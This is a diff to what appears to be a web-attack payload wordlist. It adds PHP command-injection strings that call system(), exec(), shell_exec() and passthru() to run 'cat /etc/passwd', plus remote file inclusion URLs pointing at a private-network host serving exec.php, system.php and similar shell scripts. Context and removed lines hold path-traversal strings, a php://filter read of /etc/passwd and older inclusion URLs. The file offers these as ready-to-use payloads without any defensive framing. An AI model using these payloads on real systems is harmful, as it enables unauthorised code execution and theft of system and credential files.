@@ -99,6 +99,110 @@ test
 %252e%252e%252f%252e%252e%252f%252e%252e%252fhosts%00
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fhosts
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fhosts%00
+;system('cat /etc/passwd');
+|system('cat /etc/passwd');
+||system('cat /etc/passwd');
+&system('cat /etc/passwd');
+&&system('cat /etc/passwd');
+;_exec('cat /etc/passwd');
+|_exec('cat /etc/passwd');
+||_exec('cat /etc/passwd');
+&_exec('cat /etc/passwd');
+&&exec('cat /etc/passwd');
+;shell_exec('cat /etc/passwd');
+|shell_exec('cat /etc/passwd');
+||shell_exec('cat /etc/passwd');
+&shell_exec('cat /etc/passwd');
+&&shell_exec('cat /etc/passwd');
+;passthru('cat /etc/passwd');
+|passthru('cat /etc/passwd');
+||passthru('cat /etc/passwd');
+&passthru('cat /etc/passwd');
+&&passthru('cat /etc/passwd');
+test;system('cat /etc/passwd');
+test|system('cat /etc/passwd');
+test||system('cat /etc/passwd');
+test&system('cat /etc/passwd');
+test&&system('cat /etc/passwd');
+test;_exec('cat /etc/passwd');
+test|_exec('cat /etc/passwd');
+test||_exec('cat /etc/passwd');
+test&_exec('cat /etc/passwd');
+test&&exec('cat /etc/passwd');
+test;shell_exec('cat /etc/passwd');
+test|shell_exec('cat /etc/passwd');
+test||shell_exec('cat /etc/passwd');
+test&shell_exec('cat /etc/passwd');
+test&&shell_exec('cat /etc/passwd');
+test;passthru('cat /etc/passwd');
+test|passthru('cat /etc/passwd');
+test||passthru('cat /etc/passwd');
+test&passthru('cat /etc/passwd');
+test&&passthru('cat /etc/passwd');
+http://172.20.10.8/exec.php
+http://172.20.10.8/exec.php%00
+http://172.20.10.8/exec.txt
+http://172.20.10.8/exec.txt%00
+http://172.20.10.8/execBlind.php
+http://172.20.10.8/execBlind.php%00
+http://172.20.10.8/execBlind.txt
+http://172.20.10.8/execBlind.txt%00
+http://172.20.10.8/passthru.php
+http://172.20.10.8/passthru.php%00
+http://172.20.10.8/passthru.txt
+http://172.20.10.8/passthru.txt%00
+http://172.20.10.8/passthruBlind.php
+http://172.20.10.8/passthruBlind.php%00
+http://172.20.10.8/passthruBlind.txt
+http://172.20.10.8/passthruBlind.txt%00
+http://172.20.10.8/shell_exec.php
+http://172.20.10.8/shell_exec.php%00
+http://172.20.10.8/shell_exec.txt
+http://172.20.10.8/shell_exec.txt%00
+http://172.20.10.8/shell_execBlind.php
+http://172.20.10.8/shell_execBlind.php%00
+http://172.20.10.8/shell_execBlind.txt
+http://172.20.10.8/shell_execBlind.txt%00
+http://172.20.10.8/system.php
+http://172.20.10.8/system.php%00
+http://172.20.10.8/system.txt
+http://172.20.10.8/system.txt%00
+http://172.20.10.8/system_Blind.php
+http://172.20.10.8/system_Blind.php%00
+http://172.20.10.8/system_Blind.txt
+http://172.20.10.8/system_Blind.txt%00
+;http://172.20.10.8/exec.php
+;http://172.20.10.8/exec.php%00
+;http://172.20.10.8/exec.txt
+;http://172.20.10.8/exec.txt%00
+;http://172.20.10.8/execBlind.php
+;http://172.20.10.8/execBlind.php%00
+;http://172.20.10.8/execBlind.txt
+;http://172.20.10.8/execBlind.txt%00
+;http://172.20.10.8/passthru.php
+;http://172.20.10.8/passthru.php%00
+;http://172.20.10.8/passthru.txt
+;http://172.20.10.8/passthru.txt%00
+;http://172.20.10.8/passthruBlind.php
+;http://172.20.10.8/passthruBlind.php%00
+;http://172.20.10.8/passthruBlind.txt
+;http://172.20.10.8/passthruBlind.txt%00
+;http://172.20.10.8/shell_exec.php
+;http://172.20.10.8/shell_exec.php%00
+;http://172.20.10.8/shell_exec.txt
+;http://172.20.10.8/shell_exec.txt%00
+;http://172.20.10.8/shell_execBlind.php
+;http://172.20.10.8/shell_execBlind.php%00
+;http://172.20.10.8/shell_execBlind.txt
+;http://172.20.10.8/shell_execBlind.txt%00
+;http://172.20.10.8/system.php
+;http://172.20.10.8/system.php%00
+;http://172.20.10.8/system.txt
+;http://172.20.10.8/system.txt%00
+;http://172.20.10.8/system_Blind.php
+;http://172.20.10.8/system_Blind.php%00
+;http://172.20.10.8/system_Blind.txt
+;http://172.20.10.8/system_Blind.txt%00
 
 ..//etc/passwd
 ../..//etc/passwd
@@ -915,37 +1019,3 @@ test
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
-
-php://filter/convert.base64-encode/resource=/etc/passwd
-http://192.168.1.72/exec.php
-http://192.168.1.72/exec.php%00
-http://192.168.1.72/exec.txt
-http://192.168.1.72/exec.txt%00
-http://192.168.1.72/execBlind.php
-http://192.168.1.72/execBlind.php%00
-http://192.168.1.72/execBlind.txt
-http://192.168.1.72/execBlind.txt%00
-http://192.168.1.72/passthru.php
-http://192.168.1.72/passthru.php%00
-http://192.168.1.72/passthru.txt
-http://192.168.1.72/passthru.txt%00
-http://192.168.1.72/passthruBlind.php
-http://192.168.1.72/passthruBlind.php%00
-http://192.168.1.72/passthruBlind.txt
-http://192.168.1.72/passthruBlind.txt%00
-http://192.168.1.72/shell_exec.php
-http://192.168.1.72/shell_exec.php%00
-http://192.168.1.72/shell_exec.txt
-http://192.168.1.72/shell_exec.txt%00
-http://192.168.1.72/shell_execBlind.php
-http://192.168.1.72/shell_execBlind.php%00
-http://192.168.1.72/shell_execBlind.txt
-http://192.168.1.72/shell_execBlind.txt%00
-http://192.168.1.72/system.php
-http://192.168.1.72/system.php%00
-http://192.168.1.72/system.txt
-http://192.168.1.72/system.txt%00
-http://192.168.1.72/system_Blind.php
-http://192.168.1.72/system_Blind.php%00
-http://192.168.1.72/system_Blind.txt
-http://192.168.1.72/system_Blind.txt%00
